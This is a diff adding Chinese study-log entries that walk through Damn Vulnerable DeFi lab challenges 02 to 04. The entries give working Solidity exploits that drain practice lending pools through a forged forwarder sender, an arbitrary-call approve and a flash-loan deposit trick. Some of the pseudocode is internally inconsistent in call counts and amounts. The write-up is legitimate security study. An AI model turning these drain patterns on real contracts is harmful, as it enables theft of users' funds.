+  - 所以，`totalDeposits` 應該會是 (部署時放進去的 1000 顆 WETH + `NaiveReceiver` 被收繳的手續費 10 顆 WETH) 
+    - 也就是說 `totalDeposits` 至少有 (1000 + 10)e18
+    - 足夠讓我們發起 `withdraw(amount=1010e18)` 了
+  - 再來要思考 `deposits[_msgSender()] -= amount;` 中存在的漏洞
+  - 從 [_msgSender() 的代碼](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L87) 中我們可以觀察到，當 caller 是 `BasicForwarder` 合約的時候，我們就有機會操縱 `_msgSender()` 的返回值
+  - `BasicForwarder` 基本上是要我們建構基於 EIP712 簽名過的 Request，然後 `BasicForwarder` 合約就會幫我們代為呼叫 Request
+  - Request 裡面要塞什麼？
+    - 利用 `multicall()` 幫我們做一系列動作
+      - 呼叫十次 `flashLoan(receiver=FlashLoanReceiver, token=WETH, amount=1e18, data="")` 函數 (為了把 Receiver 持有的 WETH 透過手續費的方式給到 Pool)
+      - 用 low-level call 的方式，呼叫 `withdraw(amount=1020e18, receiver=tx.origin)`，並且在 calldata 內附加 `deployer` 的地址
+        - 必須用 low-level call 的方式，才能使 `_msgSender()` 返回 `deployer` 的地址
+        - 以便於通過 `deposits[_msgSender()] -= amount;`
+  - 怎麼把 Request 塞給 `BasicForwarder.execute(Request calldata request, bytes calldata signature)`？
+    - `request.from` 是自己
+    - `request.target` 當然是 pool
+    - `request.value` 雖然可以使用 payable 但這邊用不到，所以塞 0 即可
+    - `request.gas` 隨便塞個大數都可以，就塞 3000m 好了
+    - `request.nonce` 因為我們在 Foundry 玩，用的是 test account，所以塞 0 就好
+    - `request.data` 按照上述所說，組成一個 `multicall()` 的呼叫
+    - `request.deadline` 不重要，給個大數或 `block.timestamp` 都可以
+  - 最後再依照 EIP712 的標準，算出 signature，應該就可以調用 `BasicForwarder.execute()` 來通過了
+
+將上述的解題想法組成一部分偽代碼
+
+1. 先組建 `NaiveReceiverPooll.multicall(bytes[] calldata data)` 的 ABI Calldata
+
+```solidity=
+# 已知會有 10 + 1 組 data
+
+# 前 10 組 - 用來把 receiver 的 WETH 透過手續費的方式，轉給 pool
+# flashLoan(receiver=FlashLoanReceiver, token=WETH, amount=1e18, data="")
+data[0] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[1] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[2] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[3] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[4] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[5] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[6] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[7] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[8] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[9] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+data[10] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
+# 第 11 組 - 利用 _msgSender() 藏的後門，把 pool 的資金全部提走
+# withdraw(amount=1010e18, payable receiver=player) + address(deployer)
+data[11] = abi.encodeCall(pool.withdraw, (1000e18+10e18, payable(player)), deployer)
+```
+
+2. 把 `NaiveReceiverPooll.multicall(bytes[] calldata data)` 組成一個 `BasicForwarder.Request`
+
+```
+BasicForwarder.Request({
+  from: player,
+  value: 0,
+  gas: 30000000,
+  nonce: 0,
+  data: abi.encodeCall(pool.multicall, data),
+  deadline: type(uint256).max
+})
+```
+
+3. 算出 `BasicForwarder.Request` 的 signature
+
+```solidity
+digest = keccak256(abi.encodePacked(
+  "\x19\x01",
+   forwarder.domainSeparator(),
+   forwarder.getDataHash(request)
+))
+
+(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+bytes memory signature = abi.encodePacked(r, s, v);
+```
+
+4. 執行 `BasicForwarder.execute(request, signature);`
+5. 現在 player 應該持有所有的 WETH 了，轉去 `recovery` 帳號去，破關
+
+
+解答程式碼:
+```solidity
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+function test_naiveReceiver() public checkSolvedByPlayer {
+   bytes[] memory data = new bytes[](11);
+   BasicForwarder.Request memory request;
+   bytes memory signature;
+
+   //---------------
+
+   data[0] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[1] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[2] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[3] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[4] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[5] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[6] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[7] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[8] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[9] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
+   data[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (1010e18, payable(player))), deployer);
+
+   //---------------
+
+   request = BasicForwarder.Request({
+      from: player,
+      target: address(pool),
+      value: 0,
+      gas: 30000000,
+      nonce: 0,
+      data: abi.encodeCall(pool.multicall, (data)),
+      deadline: type(uint256).max
+   });
+
+   //---------------
+
+   bytes32 digest = keccak256(abi.encodePacked(
+      "\x19\x01",
+      forwarder.domainSeparator(),
+      forwarder.getDataHash(request)
+   ));
+
+   (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+
+   signature = abi.encodePacked(r, s, v);
+
+   //---------------
+
+   forwarder.execute(request, signature);
+   weth.transfer(recovery, 1010e18);
+}
+```
+
+- [DamnVulnerableDeFi-02-NaiveReceiver.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-02-NaiveReceiver.t.sol)
+
+- 有點燒腦...
+
+### 2024.09.14
+
+- 繼續進行每日解一題挑戰
+- 今天這一題 Truster 的解法比較簡單，解法也比較快
+- 所以另外花了時間複習了一下昨天解題需要知道的 EIP712 標準
+
+
+#### [DamnVulnerableDeFi-03] Truster
+
+- 過關條件: 把 `TrusterLenderPool` 合約持有的 DVT 代幣餘額榨乾
+  - [已知 `TrusterLenderPool` 有 100 萬顆 DVT 代幣](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/truster/Truster.t.sol#L36)
+  - 並且沒有發給我們任何 DVT 代幣
+  - 我們只能有 `TrusterLenderPool.flashLoan()` 函數可以呼叫
+- 解法:
+  - 這一題的合約代碼簡單許多，只有 `TrusterLenderPool.flashLoan()` 需要關注
+  - 所以漏洞肯定藏在 `TrusterLenderPool.flashLoan()` 裡面
+  - 但 `flashLoan()` 有個限制: 閃電貸之後，balance 必須大於 `balanceBefore`
+    - 並且這個函數有重入保護
+  - 所以唯一可疑的地方就在 [target.functionCall(data)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/truster/TrusterLenderPool.sol#L28) 了
+  - 此處的 [target.functionCall(data)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/truster/TrusterLenderPool.sol#L28) 是一個非常明顯很不安全的作法
+  - 一般來說，正常的閃電貸應該會是 callback 到調用者的 context 裡面，讓調用者(borrower)來決定拿到貸款後要做什麼操作
+  - 可是這邊，很明顯的是**由 `TrusterLenderPool` 代為操作**
+  - **即: `TrusterLenderPool` 存在任意代碼執行漏洞**
+  - 所以我們現在知道，我們可以以 `TrusterLenderPool` 的身份，去執行我們想做的任意 Operations
+  - 那麼現在問題在於，我們應該怎麼透過這個漏洞把 DVT token 偷走呢？有 `balanceBefore` 檢查耶
+  - 答案就是利用 `ERC20.approve()`，讓 `TrusterLenderPool` 給我們的帳號授予 spender 轉帳權限就好了
+
+- 先構造解答程式碼出來:
+
+```solidity=
+function test_truster() public checkSolvedByPlayer {
+    uint256 amount = 1;
+    address borrower = address(pool);
+    address target = address(token);
+    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max);
+    pool.flashLoan(amount, borrower, target, data);
+    token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+}
+```
+
+- 你會發現這時候執行 `forge test --match-path test/truster/Truster.t.sol  -vvvv` 是會得到 revert 的
+- `[FAIL. Reason: Player executed more than one tx: 0 != 1] test_truster()`
+- 因為題目要求我們必須只能用一個 transaction 來解答
+- 但我們可以偷偷把 [assertEq(vm.getNonce(player), 1)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/truster/Truster.t.sol#L67) 註解掉
+- 再次執行，是會成功運行的，代表我們的漏洞利用思路是正確的
+- 只差要把 Exploit 寫成一個 Contract，再丟去執行即可
+- 所以我們再次修改 Exploit Code 即可
+
+```
+function test_truster() public checkSolvedByPlayer {
+    new Exploit(token, pool, recovery, TOKENS_IN_POOL);
+}
+
+contract Exploit {
+    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 TOKENS_IN_POOL) {
+        uint256 amount = 1;
+        address borrower = address(pool);
+        address target = address(token);
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
+        pool.flashLoan(amount, borrower, target, data);
+        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
+    }
+}
+```
+
+- [DamnVulnerableDeFi-03-Truster.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-03-Truster.t.sol)
+
+
+### 2024.09.16
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-04] Side Entrance
+
+- 過關條件: 把 `SideEntranceLenderPool` 合約持有的 1000 顆 ETH 偷走，轉到 recovery 帳號
+- 解法:
+  - 這題有點水，直接講解法
+  - 我們只要發起 `flashLoan()` 呼叫
+  - 在 `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` 的 callback context 中，呼叫 `deposit()` 把閃電貸借款直接存進去
+  - 因為 `SideEntranceLenderPool` 只是單純的檢查 `flashLoan()` 前與後的 balance，所以利用這種方式就可以讓我們憑空增加 `balances[msg.sender]`
+  - 最後再呼叫 `withdraw()` 把 `SideEntranceLenderPool` 合約的 ETH 幹走即可
+
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    Exploit exp = new Exploit(pool, ETHER_IN_POOL);
+    exp.start();
+    payable(recovery).transfer(ETHER_IN_POOL);
+}
+
+contract Exploit {
+    SideEntranceLenderPool pool;
+    uint256 ETHER_IN_POOL;
+
+    constructor(SideEntranceLenderPool _pool, uint256 _ETHER_IN_POOL) {
+        pool = _pool;
+        ETHER_IN_POOL = _ETHER_IN_POOL;
+    }
+    
+    function start() external {
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+```
+
+- [DamnVulnerableDeFi-04-SideEntrance.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-04-SideEntrance.t.sol)
+
+
 <!-- Content_END -->
